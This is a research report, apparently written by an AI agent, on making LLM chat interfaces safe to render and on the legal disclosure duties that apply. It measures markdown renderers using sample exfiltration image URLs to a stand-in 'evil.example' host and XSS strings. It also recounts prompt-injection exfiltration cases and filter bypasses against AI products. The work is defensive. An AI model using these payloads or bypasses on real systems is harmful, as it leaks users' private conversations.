---
title: "UX-AI output trust and safety: what an LLM interface must disclose, show and refuse to render"
program: product
sub_program: ux
topic: ux-ai-features
worker: output-trust-and-safety
agent: deep-dive researcher
date_researched: 2026-11-27
model: sonnet
sources_fetched: 19
sources_count: 19
scope: >
  Covers what a human-facing LLM interface does with model output before showing it: untrusted-content labelling,
  markdown rendering (images, links, raw HTML), citation display, confidence wording, explanation stance, and the
  disclosure duties now in law (EU AI Act Art. 50, California SB 243 and the AI Transparency Act).
  Out of scope: action approval (UX-ACT) and model-pipeline security (security territory; named only).
---

# UX-AI output trust and safety

## Contents

1. [Summary](#summary)
2. [Findings](#findings)
3. [Normative guidance candidates](#normative-guidance-candidates)
4. [What an agent must not decide alone](#what-an-agent-must-not-decide-alone)
5. [AI-agent angle](#ai-agent-angle)
6. [Contested / evolving](#contested--evolving)
7. [Dated facts](#dated-facts)
8. [Sources](#sources)

## Summary

- Treat all model output as untrusted input to the renderer. OWASP LLM05:2025 says to use a zero-trust approach and to encode output for the context it lands in ([OWASP LLM05](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)).
- Measured, 2026-11-27: with default settings, `marked` 18.3.0, `markdown-it` 15.0.3 and `react-markdown` 10.1.0 all render a remote markdown image `![x](https://evil.example/p.png?d=SECRET)` as a live `<img>` that the browser fetches. None of the three blocks the exfiltration channel by default.
- Measured: `marked` also passes raw `<script>`, `<iframe>` and `<img onerror>` through, and keeps `javascript:` and `data:` hrefs. `markdown-it` and `react-markdown` escape raw HTML by default.
- Measured: `DOMPurify` on `marked` output removes script, iframe and `javascript:` hrefs but keeps remote `<img src>`. A sanitizer is not an image policy.
- The fix is an image and link policy in the renderer plus a CSP `img-src` header. Both are cheap and checkable.
- Real products shipped this bug and fixed it the same way: Bing Chat (2023), Mistral Le Chat (2024), GitLab Duo, Microsoft 365 Copilot, Salesforce Agentforce and Superhuman AI (2025-2026) ([Willison tag page](https://simonwillison.net/tags/markdown-exfiltration/)).
- Label external content as untrusted in the model input and, in the UI, show where each rendered fact came from. OWASP LLM01 says to "separate and clearly denote untrusted content" ([OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)).
- Citations are not proof. Across four commercial generative search engines (audited 2023, vendor products, independent study), 51.5% of sentences were fully supported by their citations and 74.5% of citations supported their sentence ([Liu et al.](https://arxiv.org/abs/2304.09848)).
- Explanations raise acceptance regardless of correctness and did not beat a bare confidence score in team accuracy ([Bansal et al.](https://arxiv.org/abs/2006.14779)). Do not add explanations as a trust device.
- First-person uncertainty wording ("I'm not sure, but...") cut agreement from 80.9% to 74.8% and raised accuracy when the AI was wrong, in a pre-registered N=404 study ([Kim et al.](https://arxiv.org/abs/2405.00623)). Test wording; do not assume.
- Show a numeric confidence only if testing shows it improves decisions ([PAIR](https://pair.withgoogle.com/chapter/explainability-trust/)).
- Law, as of 2026-11-27: EU AI Act Art. 50 applies since 2 August 2026. Systems that interact with people must tell them it is an AI, at or before first interaction, accessibly ([Art. 50 text](https://artificialintelligenceact.eu/article/50/); [Morgan Lewis](https://www.morganlewis.com/ru/blogs/sourcingatmorganlewis/2026/08/eu-ai-acts-transparency-rules-what-went-into-effect-on-2-august)).
- Only the machine-readable marking duty for generative systems already on the market was deferred, to 2 December 2026 (two law firms, secondary).
- California SB 243 (companion chatbots), signed 2025-10-13 ([Skadden, 2025-10-17](https://skadden.com/insights/publications/2025/10/new-california-companion-chatbot-law)): clear and conspicuous AI notice when a reasonable person could be misled; break reminders at least every three hours for known minors ([FPF, 2025-11-04](https://fpf.org/blog/understanding-the-new-wave-of-chatbot-legislation-california-sb-243-and-beyond/); [Skadden, 2025-10-17](https://skadden.com/insights/publications/2025/10/new-california-companion-chatbot-law)). The 1 January 2026 effective date is UNVERIFIED by an opened page (only search snippets; [Perkins Coie](https://perkinscoie.com/insights/update/california-companion-chatbot-law-now-effect) states it, not opened). Damages figures are disputed between sources (see Contested); the statute text ([chaptered text on LegiScan](https://legiscan.com/CA/text/SB243/2025)) returned HTTP 403, so do not quote an amount.
- California's AI Transparency Act became operative 2 August 2026 and was amended by SB 1000 on 30 September 2026: manifest-disclosure option removed, latent disclosure kept ([MoFo, 2026-10-01](https://www.mofo.com/resources/insights/261001-california-revamps-ai-transparency-requirements)).

## Findings

### 1. Untrusted-content separation and labelling

OWASP LLM01:2025 lists "Segregate external content: separate and clearly denote untrusted content to limit its influence on user prompts" as one of seven mitigations, next to "treat the model as an untrusted user" in adversarial testing and "define and validate output formats" with deterministic code ([OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/), 2025, authority). The page names an indirect-injection scenario where hidden instructions make the model "insert an image linking to a URL, leading to exfiltration of the private conversation". The page gives no date beyond "2025".

For the interface this means two separate duties:

- **Input side.** Every retrieved page, file, email or tool result that enters the prompt is wrapped and labelled as data in a way the model is told to treat as data. This is a pipeline duty (security territory; named only here). The interface's share is that the origin of each chunk is kept as structured metadata so the UI can show it.
- **Output side.** The UI shows which external sources contributed to an answer, and renders their text as quoted data, never as interface chrome. Text that came from an external source must not be able to produce a button, a form, or a label that looks like system UI.

No source fetched gives a tested wording or visual treatment for "untrusted" labels. That part is a design decision, not a measured result.

### 2. Rendering: what three renderers do by default (measured)

Method (reproducible): `cd ~/.cache/research-lang/exemplars/product/mdtest && npm i marked markdown-it react-markdown react react-dom remark-gfm dompurify jsdom && node t.mjs`. Versions installed: `marked@18.3.0`, `markdown-it@15.0.3`, `react-markdown@10.1.0` (with `react@19.3.1`, `react-dom@19.3.1`, `remark-gfm@4.0.1`), `dompurify@3.5.0`, `jsdom@31.0.1`. Node v26.13.1 (as printed by `node -v`). Server-side string render: `marked.parse`, `new MarkdownIt().render`, `renderToStaticMarkup(<ReactMarkdown>)`. Inputs are the ten strings in the script; the secret is the literal `SECRET123`.

| Input | marked | markdown-it (default) | react-markdown (default) | react-markdown + remark-gfm |
|---|---|---|---|---|
| `![x](https://evil.example/p.png?d=SECRET123)` | live `<img src=...?d=SECRET123>` | live `<img>` | live `<img>` plus a hoisted `<link rel="preload" as="image" href=...?d=SECRET123>` | same as default |
| reference-style `![x][r]` + `[r]: https://...` | live `<img>` | live `<img>` | live `<img>` plus preload link | same |
| bare `see https://evil.example/c?q=SECRET123` | auto-linked `<a>` | plain text (no link) | plain text | auto-linked `<a>` |
| `<https://evil.example/c?q=SECRET123>` | `<a>` | `<a>` | `<a>` | `<a>` |
| `[click](https://evil.example/...)` | `<a>` | `<a>` | `<a>` | `<a>` |
| `[x](javascript:alert(1))` | `<a href="javascript:alert(1)">` | left as literal text | `<a href="">` | `<a href="">` |
| `[x](data:text/html;base64,...)` | `<a href="data:...">` | literal text | `<a href="">` | `<a href="">` |
| raw `<img src=... onerror=alert(1)>` | passed through unchanged, `onerror` kept | escaped to text | escaped to text | escaped to text |
| `<script>alert(1)</script>` | passed through unchanged | escaped | escaped | escaped |
| `<iframe src=...>` | passed through unchanged | escaped | escaped | escaped |

Also measured: `new MarkdownIt({linkify:true})` auto-links bare URLs, including the URL inside escaped HTML text. `DOMPurify.sanitize(marked.parse(s))` removed `<script>`, `<iframe>`, `onerror` and the `javascript:` and `data:` hrefs, but left `<img src="https://evil.example/p.png?d=SECRET123">` and the auto-linked query URL intact.

What the docs say, to compare against the measurements:

- `react-markdown` v10: "safe by default (no `dangerouslySetInnerHTML` or XSS attacks)"; raw HTML is escaped unless `rehype-raw` is added; the default `urlTransform` allows `http`, `https`, `irc`, `ircs`, `mailto`, `xmpp` and relative URLs ([react-markdown README](https://github.com/remarkjs/react-markdown), read 2026-11-27, authority). The README does not mention data exfiltration through images; "safe" means XSS-safe only.
- `marked`: "Marked does not sanitize the output HTML"; the docs recommend DOMPurify ([marked docs](https://marked.js.org/), authority). The measurement matches.
- `markdown-it`: the README says only "Safe by default." and points to the usage docs ([markdown-it README](https://github.com/markdown-it/markdown-it), authority). The html and linkify defaults were not stated on that page; the defaults above are measured, not quoted.

Not measured: client-side React 19 behaviour of the hoisted preload link (only `renderToStaticMarkup` output was captured), streaming of partial markdown, and `react-markdown` + `rehype-sanitize` (installed, not tested). The preload observation says only that the image URL can be requested before or without the visible `<img>` being mounted in at least the server-render path.

A tested fix (same session, script `f.mjs`): `react-markdown` with `components={{img: ({alt}) => <span>[image blocked: {alt}]</span>, a: ...}}` produced `[image blocked: x]` and no `<img>` and no preload link in the string output. `marked` with `renderer.image = ({text}) => '[image blocked: '+text+']'` produced the same. The `react-markdown` run showed no `<link rel="preload">` for the blocked image.

### 3. Why images and links are the channel

The mechanism is a render-time fetch the user never approves: the model emits a markdown image whose URL carries conversation data; the browser fetches it; the attacker reads the query string. Johann Rehberger showed this against Bing Chat in 2023: reported to MSRC 2023-04-08, fixed 2023-06-15, post dated 2023-06-18; he believes Microsoft added a CSP restricting images to Bing domains ([Embrace The Red](https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/), researcher blog, independent).

The Willison tag page lists the later cases with dates and fixes ([simonwillison.net](https://simonwillison.net/tags/markdown-exfiltration/), independent, accessed 2026-11-27):

| Product | Date on page | Fix on page |
|---|---|---|
| Mistral Le Chat | 2024-10-22 | markdown images restricted |
| Anthropic Claude iOS | 2024-12-17 | fixed, method not stated |
| GitLab Duo | 2025-05-23 | allowlist of trusted domains for links and images |
| Microsoft 365 Copilot (EchoLeak, CVE-2025-32711) | 2025-06-11 | fixed; reference-style image syntax had bypassed the link filter; CSP allow-list with an open redirect was abused |
| Salesforce Agentforce (ForcedLeak) | 2025-09-26 | CSP corrected (an expired allowed domain), "Trusted URLs" blocking |
| Google Antigravity | 2025-11-25 | none confirmed; reportedly called intended behaviour |
| Superhuman AI | 2026-01-12 | CSP rule for an allowed domain addressed |
| Microsoft Copilot Cowork | 2026-05-26 | none mentioned |

Two lessons from the table. First, the reference-style image bypass (`![x][r]`) is a real filter failure and is in the measured set above: a regex on `![](...)` is not enough. Second, an allow-listed domain that hosts attacker-writable content (Google Docs, Google Forms, an open redirect) defeats the allow-list. OWASP LLM05 lists a related reference, "Markdown images can steal your chat data", and requires strict CSP among its mitigations ([OWASP LLM05](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)).

CSP `img-src` blocks images that are not from an allowed source and falls back to `default-src` if absent ([MDN img-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/img-src), authority). Minimal form: `Content-Security-Policy: img-src 'self'`.

Links need a different rule from images. A link needs a click, so it leaks only after the user acts, but a model-chosen URL can carry data in its query string and look trustworthy. Show the destination host next to the link text and drop links whose host is not on a list the product owns, or route them through an interstitial. The measured `react-markdown` link test shows that `javascript:` and `data:` are neutralised by default there, but not in `marked`.

### 4. Citations

Liu, Zhang and Liang audited four generative search engines with human evaluation, arXiv v1 2023-04-19, v2 2023-10-23: on average 51.5% of generated sentences were fully supported by their citations (citation recall) and 74.5% of citations supported their sentence (citation precision) ([arXiv 2304.09848](https://arxiv.org/abs/2304.09848), independent study of vendor products). The abstract page names no per-engine breakdown in the portion fetched, and the engines tested in 2023 are not current products. Treat the numbers as an existence proof that a citation marker does not imply support, not as a current benchmark.

Consequences for display:

- A citation marker is a claim by the system, not a verification. Show it as "source the model says it used", with the title and host of each source visible without a click.
- Link each marker to the exact passage when the pipeline has it (a quote or anchor), not just the page. If the pipeline cannot supply the passage, say "source page" and not "supported by".
- Never render a citation the pipeline did not retrieve. Verify with code that each cited URL or id is in the retrieved set before showing the marker. Citations for items outside the retrieved set are invented.
- Kim et al. found that when uncertainty wording was shown, participants who disagreed said it was "because of the uncertainty"; one reported "If the AI didn't seem confident, I would look on the links" ([arXiv 2405.00623](https://arxiv.org/pdf/2405.00623), Sec. 4.1-4.2). Source links are the user's recovery path; make them cheap to open.

### 5. Confidence

PAIR's guidance, fetched 2026-11-27 (Google People + AI Research, authority on its own guidance; undated page): show confidence "only if it improves decisions", test first, skip it if it is "distracting, misleading, or hard to act on"; numeric values are risky without context, categorical needs defined cutoffs and the action each implies, N-best alternatives are most useful at low confidence ([PAIR](https://pair.withgoogle.com/chapter/explainability-trust/)).

The two papers give measured numbers:

- Kim et al. (FAccT 2024, pre-registered, N=404, medical questions, fictional LLM search engine; independent academic with Microsoft authors): agreement with the AI was 80.9% in the control (no uncertainty wording), 74.8% with first-person uncertainty ("I'm not sure, but...", significant), 77.6% with general-perspective uncertainty (not significant), and 58.4% with no AI. Accuracy when the AI was wrong: 33.0% control vs 64.7% no-AI; with uncertainty on the specific wrong answers 43.6% to 52.0% (first-person) and 32.8% to 48.0% (general). Cost: accuracy on correct AI answers fell from 92.2% to 89.2% (first-person) and 94.8% to 83.1% (general). Overall correct: 63.9% control vs 72.8% first-person (significant, p<0.01 in the paper's table) ([Kim et al., PDF](https://arxiv.org/pdf/2405.00623), Table 1 and Sec. 4.5; abstract at [arXiv 2405.00623](https://arxiv.org/abs/2405.00623)). Overreliance was not eliminated.
- Bansal et al. (CHI 2021, three datasets, around 100 participants per condition): a bare AI recommendation plus confidence score reached complementary performance (Beer: 0.89 vs AI 0.84 and humans 0.82); there was no significant gain from adding explanations over that baseline ([arXiv 2006.14779](https://arxiv.org/abs/2006.14779), PDF Sec. 6). Participants said they used confidence thresholds: 27% reported an explicit threshold, for example "If Marvin was above 85% confidence, I took his word for it".

Design consequence: when the system can emit a calibrated signal, a categorical label with a defined action ("Check the source before using this") is the PAIR-compatible option. When it cannot, hedge in words only where the system actually has low support (retrieval empty, sources conflict, out of domain), and use first-person wording as the tested variant. Do not decorate every answer with hedges; the study shows hedging also lowered accuracy on correct answers.

Caveat: the confidence in Bansal was a classifier probability from a calibrated model, not an LLM's self-report. LLM self-reported certainty is not shown in any fetched source to be calibrated. Do not display an LLM-generated percentage as a probability.

### 6. Explanations

Bansal et al.: "explanations increased the chance that humans will accept the AI's recommendation, regardless of its correctness" and did not increase complementary gains ([arXiv 2006.14779](https://arxiv.org/abs/2006.14779)). In the paper's team results Explain-Top-1 vs Explain-Top-2 differed by z=0.85 p=.40 (Beer), z=0.81 p=.42 (Amzbook), z=0.42 p=.68 (LSAT); for Beer and LSAT, Explain-Top-1 worsened performance when the AI was incorrect (Fig. 4 caption in the PDF). Adaptive explanations that show the counter-argument seemed to help but were not significantly better than showing confidence. Note: the tasks were classification with a 84-ish% AI, not open-ended LLM chat.

PAIR's counterweight: match depth to stakes; in high stakes cases give the reasoning, not just the result; prefer partial explanations; use progressive disclosure; tie explanations to user actions ([PAIR](https://pair.withgoogle.com/chapter/explainability-trust/)).

Stance: explanations are for the user's decision (what data was used, what would change the result, where to check), not for persuasion. An explanation that makes acceptance easier without a check path increases overreliance. Show evidence the user can verify (a quoted passage, a diff, a test result) in preference to a model-written rationale. This is an inference from the two sources; neither tested LLM-written rationales directly.

### 7. Which duties are law (as of 2026-11-27)

**EU AI Act Art. 50** ([Art. 50 text](https://artificialintelligenceact.eu/article/50/), reproduction of the Regulation; read 2026-11-27):

- 50(1): providers must design AI systems that interact directly with people so people are informed they are interacting with an AI, unless obvious to a reasonably well-informed, observant and circumspect person.
- 50(2): providers of systems generating synthetic audio, image, video or text must mark outputs in a machine-readable format and make them detectable as artificial.
- 50(3): deployers of emotion recognition or biometric categorisation must inform exposed people.
- 50(4): deployers must disclose deep fakes and AI-generated text published to inform the public on matters of public interest, unless human review or editorial control with editorial responsibility applies.
- 50(5): the information must be "clear and distinguishable", given at the latest at first interaction or exposure, and meet applicable accessibility requirements.

Application date: Law-firm analyses state Art. 50 applied from 2 August 2026, with only the 50(2) marking duty for generative systems already on the EEA market before that date deferred to 2 December 2026 ([Morgan Lewis, Aug 2026](https://www.morganlewis.com/ru/blogs/sourcingatmorganlewis/2026/08/eu-ai-acts-transparency-rules-what-went-into-effect-on-2-august); [Goodwin, Aug 2026](https://www.goodwinlaw.com/en/insights/publications/2026/08/alerts-technology-dpc-eu-ai-act-transparency-obligations-now-in-force)). Goodwin states Regulation (EU) 2026/1744 entered into force 27 July 2026 and moved high-risk obligations to 2 December 2027 (Annex III) and 2 August 2028 (Annex I). The official OJ text of 2026/1744 was not fetched. A search snippet claiming fines up to 15 million euros or 3% of turnover for Art. 50 breaches came from search results and was not verified on an opened page; do not quote it.

**California SB 243 (companion chatbots):** opened secondary sources: [Skadden, 2025-10-17](https://skadden.com/insights/publications/2025/10/new-california-companion-chatbot-law) (signed 2025-10-13; clear and conspicuous notice that the chatbot is artificial when a reasonable person could be misled; for known minors, AI disclosure plus reminders at least every three hours; private right of action, reported there as the greater of $1,000 per violation or actual damages, plus fees) and [FPF, 2025-11-04](https://fpf.org/blog/understanding-the-new-wave-of-chatbot-legislation-california-sb-243-and-beyond/) (same duties; reports damages of at least $1,000). The statute ([chaptered text on LegiScan](https://legiscan.com/CA/text/SB243/2025); leginfo) returned HTTP 403, so duties are secondary-sourced. Effective date 1 January 2026 is unverified by an opened page: [Perkins Coie](https://perkinscoie.com/insights/update/california-companion-chatbot-law-now-effect) and [Gunderson Dettmer](https://www.gunder.com/print/v2/content/23646/client-insight-california-sb-243-new-compliance-requirements-for-operators-of-ai-companion-chatbots.pdf?lang=en) state it in search snippets only. Scope is "companion chatbot", which excludes many customer-service and developer-tool bots; whether a product is in scope is a legal call.

**California AI Transparency Act (SB 942 as amended by AB 853 and SB 1000):** AB 853 moved operative date from 1 January 2026 to 2 August 2026; SB 1000, enacted 30 September 2026 and effective immediately, removes the manifest-disclosure option, keeps latent disclosures for image, video and audio, and removes the one-million-monthly-user threshold; large online platforms and GenAI hosting platforms from 1 January 2027, capture devices from 1 January 2028 ([MoFo, 2026-10-01](https://www.mofo.com/resources/insights/261001-california-revamps-ai-transparency-requirements), law firm). It covers image, video and audio, not text. A pre-SB 1000 Morgan Lewis alert said both latent and manifest option applied; the later MoFo account supersedes it on that point (conflict flagged).

Reading for an interface that streams text: the disclosure that the user is talking to an AI is the one text-chat duty with legal force in both jurisdictions (EU in force; California limited to companion chatbots). Marking synthetic text in a machine-readable way is an EU provider duty that sits in the model or API layer, not in the UI.

## Normative guidance candidates

IDs are provisional (`OTS-n`) for the consolidator.

1. **OTS-1 (MUST).** Disclose in the UI that the user is interacting with an AI system, in text visible without scrolling or clicking, at or before the first AI turn, in text that a screen reader announces. Rationale: EU AI Act Art. 50(1) and 50(5) apply since 2 August 2026 ([Art. 50](https://artificialintelligenceact.eu/article/50/)). Verification: grep the first-render component of the chat or AI surface for a visible string matching `AI|assistant|bot|generated` outside `aria-hidden`; fail if the only disclosure is in a tooltip, a footer terms link, or an icon without text; run an a11y tree dump (for example `axe` or the browser accessibility tree) and confirm the string is present. Exempt only where the AI nature is obvious, which is a legal call (see "must not decide alone").
2. **OTS-2 (MUST).** Never render a model-supplied `<img>` or markdown image whose host is not on a product-owned allowlist, and enforce the same allowlist in a CSP `img-src` header. Rationale: render-time fetch exfiltrates conversation data (measured above; Bing Chat 2023, Mistral, GitLab Duo, M365 Copilot, Agentforce, Superhuman). Verification (Detect): `grep -RnE "marked\.parse|new MarkdownIt|<ReactMarkdown|react-markdown|dangerouslySetInnerHTML" src` finds every renderer; for each, confirm an `img` override or renderer hook (`components={{img:` or `renderer.image`, or `md.renderer.rules.image`) and `curl -sI <app-url> | grep -i "content-security-policy"` contains `img-src` without `*`, `https:` or `data:`; fail on a renderer with no image hook and no CSP. Runtime test: send `![x](https://canary.example/p.png?d=1)` and `![x][r]\n\n[r]: https://canary.example/p.png` through the renderer and assert no `<img src="https://canary.example` in the output.
3. **OTS-3 (MUST).** Block `<img>` loads from allowed hosts only if the host cannot serve attacker-writable content; do not allowlist user-content hosts such as document or form hosts, URL shorteners, or hosts with open redirects. Rationale: EchoLeak, Superhuman and Agentforce bypasses abused exactly those ([Willison](https://simonwillison.net/tags/markdown-exfiltration/)). Verification: list the `img-src` entries and require a one-line owner note per host; fail on a wildcard, `https:`, or a known user-content host.
4. **OTS-4 (MUST).** Do not render raw HTML from model output. With `marked`, set a sanitizing step on the output; with `markdown-it` leave `html:false`; with `react-markdown` do not add `rehype-raw` unless followed by `rehype-sanitize` with a schema. Rationale: measured: `marked` passes `<script>`, `<iframe>`, `onerror`; the docs say it does not sanitize ([marked](https://marked.js.org/)). Verification: `grep -RnE "html: ?true|rehype-raw|allowDangerousHtml|dangerouslySetInnerHTML" src` and review each hit; in tests, assert `<script>alert(1)</script>` renders as text or is removed.
5. **OTS-5 (MUST).** Enforce a URL scheme allowlist (`https`, `mailto`, relative) on every model-supplied link and reject `javascript:` and `data:`. Rationale: measured: `marked` keeps both; `react-markdown` blanks them by default; `markdown-it` leaves them as text. Verification: unit test with `[x](javascript:alert(1))` and `[x](data:text/html;base64,PHNjcmlwdD4=)`; assert no `href` with those schemes.
6. **OTS-6 (SHOULD).** Do not auto-link bare URLs in model output (leave `linkify` off in `markdown-it`; do not enable `remark-gfm` autolink literals for model output unless a link policy runs after it). Rationale: measured: `marked` and `remark-gfm` make bare URLs with query strings clickable. Verification: grep for `linkify: ?true` and `remarkGfm`/`remark-gfm` near an LLM renderer and require a link-policy override in the same file.
7. **OTS-7 (SHOULD).** Show the destination host beside every model-supplied link and open external links with `rel="noopener noreferrer"`; strip or hide query strings in the visible text, but keep them out of the DOM only if the link is not rendered. Rationale: link text can disguise a data-carrying URL. Verification: reading heuristic. Pass: `docs (example.com)`. Fail: `[official docs](https://evil.example/c?q=<conversation text>)` with no host shown. Grep: `components={{ ?a:` or `renderer.link` exists in each renderer.
8. **OTS-8 (MUST).** Keep external content visually and structurally separate from model output and interface chrome: quote it in a block with its source host, never in an element that can look like a button, system message or form. Rationale: OWASP LLM01 "separate and clearly denote untrusted content" ([OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)). Verification: reading heuristic. Pass: retrieved web text appears inside a labelled quote block with host. Fail: retrieved text is concatenated into the assistant bubble with no boundary. Also confirm the message data model keeps a `source` field per chunk (grep for it).
9. **OTS-9 (MUST).** Show a citation marker only if the cited source id or URL is in the set the pipeline actually retrieved; drop or flag any other. Rationale: only 74.5% of citations supported their sentence in an audit of commercial engines ([Liu et al.](https://arxiv.org/abs/2304.09848)); a marker for a source never retrieved is fabricated. Verification: a unit test that feeds an answer citing `[9]` with 5 retrieved sources and asserts no marker renders; grep for the membership check in the citation component.
10. **OTS-10 (SHOULD).** Label citations as "sources used" and not as "verified" or "supported by", show source title and host without a click, and link to the passage when available. Rationale: 51.5% of sentences were fully supported by their citations in the 2023 audit. Verification: grep UI strings for `verified|fact-checked|guaranteed` near citation components and fail on hits; reading heuristic: a marker click opens the passage or says "page only".
11. **OTS-11 (SHOULD).** Do not show an LLM-generated number as a probability or percentage confidence. Show a categorical label with its defined action only if tested to improve decisions, otherwise show none. Rationale: PAIR warns numeric values mislead and says to show confidence only if it improves decisions ([PAIR](https://pair.withgoogle.com/chapter/explainability-trust/)); no fetched source shows LLM self-reported confidence is calibrated. Verification: grep for `confidence|certainty` formatted as `%` in answer components; require a linked test or user-study note for any hit.
12. **OTS-12 (SHOULD).** When the system has a reason to be uncertain (empty or conflicting retrieval, out of domain), hedge in first-person wording and offer the source links; do not hedge every answer. Rationale: first-person hedging lowered agreement 80.9% to 74.8% and raised overall accuracy 63.9% to 72.8% in N=404, but cost accuracy on correct answers (92.2% to 89.2%) ([Kim et al. PDF](https://arxiv.org/pdf/2405.00623)). Verification: the hedge string is produced only from a code condition (grep for the condition), not from a blanket system prompt line such as "always say you might be wrong".
13. **OTS-13 (SHOULD).** Do not use model-written rationale as a trust cue. Show checkable evidence (quote, diff, test output, retrieved passage) instead. Rationale: explanations raised acceptance regardless of correctness and gave no significant gain over a bare confidence score ([Bansal et al.](https://arxiv.org/abs/2006.14779)). Verification: reading heuristic. Pass: "Used 3 sources: [titles]" with passage links. Fail: a "Why I think this" paragraph with no link and an affirmative tone.
14. **OTS-14 (SHOULD).** In high-stakes surfaces (legal, medical, financial, security changes) show the reasoning and sources, not only the result, and give a one-click path to verify. Rationale: PAIR: "Don't say what without saying why in a high stakes scenario". Verification: reading heuristic against a list of surfaces the owner marks high-stakes (see decisions below).
15. **OTS-15 (MUST).** Add a regression test for the renderer policy that runs in CI: the six strings (remote image, reference-style image, bare URL with query, `javascript:` link, raw `<img onerror>`, `<script>`) must produce no remote `<img>`, no live script, and no bad-scheme href. Rationale: the reference-style bypass defeated a production filter (EchoLeak). Verification: the test exists, CI runs it, and it fails when the image hook is removed (mutate and rerun once).
16. **OTS-16 (CONSIDER).** Mark AI-generated text with a visible label or metadata where the product publishes text onward (public-interest text, emails sent on a user's behalf). Rationale: Art. 50(2) and 50(4) concern marking and disclosure of synthetic content; the exact duty depends on role and content type. Verification: ask the owner whether the product publishes text to the public (see decisions); then grep for a label component on those outputs.

## What an agent must not decide alone

- Whether the product is in scope of EU AI Act Art. 50, which role it holds (provider or deployer), and whether the AI nature is "obvious" so Art. 50(1) is waived. Ask the owner or counsel.
- Whether the product is a "companion chatbot" under California SB 243, or serves minors. Ask.
- Whether the product publishes AI-generated text to inform the public, which triggers Art. 50(4) unless human editorial responsibility exists. Ask.
- The wording of the AI disclosure and any "not advice" or safety text (brand and legal copy). Draft options; do not ship alone.
- Which image and link hosts are trusted. An agent can propose the list; the owner decides which hosts are safe to receive requests carrying conversation context.
- Which surfaces are high-stakes (OTS-14). Ask.
- Whether to display any confidence label at all. This needs a user test the agent cannot run; ask for the decision or propose the test.
- The model pipeline defences (prompt wrapping, tool permissions, output filtering): named only here, belongs to the security territory. Action approval belongs to UX-ACT.

## AI-agent angle

| Typical mistake | Why it happens | Smallest mechanical check |
|---|---|---|
| Adds `marked` or `markdown-it` for a chat UI with defaults and ships | Training examples render markdown without a threat model | OTS-2/OTS-4 grep for a renderer with no `img` hook; CI test OTS-15 |
| Trusts "react-markdown is safe by default" as covering images | The README says no XSS; measured: remote images still render, plus a preload link | Runtime test with a canary image URL |
| Writes a regex that strips `![...](...)` only | Misses reference-style images (measured; EchoLeak bypass) | The reference-style case in OTS-15 |
| Adds `rehype-raw` or `html:true` so model HTML tags show up | Looks like a feature | OTS-4 grep |
| Applies DOMPurify and considers the output safe | Measured: DOMPurify keeps remote `<img>` | CSP `img-src` plus image hook |
| Allow-lists `docs.google.com` or a CDN with user uploads | Looks like a trusted brand | OTS-3 host review |
| Renders citation numbers the model emitted without checking the retrieved set | The model invents ids | OTS-9 unit test |
| Adds "Confidence: 87%" from the model's own output | Looks authoritative | OTS-11 grep for `%` near confidence |
| Adds a "Why this answer" paragraph to build trust | Explanation heuristics from product copy | OTS-13 heuristic |
| Puts the AI disclosure only in a footer or tooltip | Treats it as legal boilerplate | OTS-1 a11y tree check |

## Contested / evolving

- **Does an explanation help or harm?** Bansal et al. (2020-21) found explanations raised acceptance regardless of correctness and did not beat a confidence score ([arXiv 2006.14779](https://arxiv.org/abs/2006.14779)); PAIR recommends matching explanation depth to stakes and giving the reasoning in high-stakes cases ([PAIR](https://pair.withgoogle.com/chapter/explainability-trust/)). The two agree on partial, user-actionable explanations and disagree in emphasis; neither tested LLM chat rationales. Trend: toward evidence the user can verify.
- **First-person vs general-perspective uncertainty.** Kim et al. found first-person significant and general-perspective not significant on agreement, but the general-perspective wording cost more accuracy on correct answers (94.8% to 83.1% vs 92.2% to 89.2%) ([PDF](https://arxiv.org/pdf/2405.00623)). One medical-question study with a fictional engine; wording effects may not transfer. The authors themselves say to test wording.
- **SB 243 damages.** [Skadden](https://skadden.com/insights/publications/2025/10/new-california-companion-chatbot-law) reports the greater of $1,000 per violation or actual damages; [FPF](https://fpf.org/blog/understanding-the-new-wave-of-chatbot-legislation-california-sb-243-and-beyond/) reports at least $1,000. Neither is the statute; no figure is a rule input.
- **EU Art. 50 dates.** One law-firm source (Goodwin) is read as saying the omnibus affects high-risk dates (December 2027, August 2028) while Article 50 applies from 2 August 2026 with a 2 December 2026 marking grace for existing systems; an unopened search result claimed otherwise and a ProductHunt post (unopened) asserted a delay of the wrong rule. The official OJ text was not fetched, so treat dates as law-firm-reported until checked on EUR-Lex.
- **California manifest disclosure.** Morgan Lewis (pre-SB 1000) said a manifest-disclosure option applied from 2 August 2026; MoFo (2026-10-01) says SB 1000 eliminated it. The later source is used here; verify on the enrolled bill.
- **Is a rendered-image exfiltration "a vulnerability"?** Willison's page reports Google calling the Antigravity markdown-image report "intended behavior" (2025-11-25). Vendors disagree about whether the renderer or the model pipeline owns the fix. This artifact takes the interface owner's position: the renderer must not fetch model-chosen URLs unprompted.

## Dated facts

| Fact | Value | Source | Source date | Type |
|---|---|---|---|---|
| Sentences fully supported by their citations (recall) | 51.5% average | [Liu et al. 2304.09848](https://arxiv.org/abs/2304.09848) | v1 2023-04-19, v2 2023-10-23 | independent study of vendor products |
| Citations that support their sentence (precision) | 74.5% | same | same | independent study |
| Agreement with AI, control vs first-person uncertainty vs no-AI | 80.9% / 74.8% / 58.4% | [Kim et al. PDF](https://arxiv.org/pdf/2405.00623) Table 1 | 2024-05-01, FAccT 2024 | independent study, N=404 |
| Overall correct, control vs first-person | 63.9% vs 72.8% | same Table 1 | same | independent study |
| Accuracy when AI is wrong, control vs no-AI | 33.0% vs 64.7% | same Sec. 4.5 | same | independent study |
| Team accuracy Beer: conf-only vs AI vs human | 0.89 vs 0.84 vs 0.82 | [Bansal et al. PDF](https://arxiv.org/pdf/2006.14779) Sec. 6 | 2020-06-26, v3 2021-01-12, CHI 2021 | independent study |
| Explain-Top-1 vs Top-2, no significant difference | p=.40 / .42 / .68 | same | same | independent study |
| OWASP LLM01:2025 mitigation "segregate external content" | text | [OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) | 2025 (no exact date) | authority |
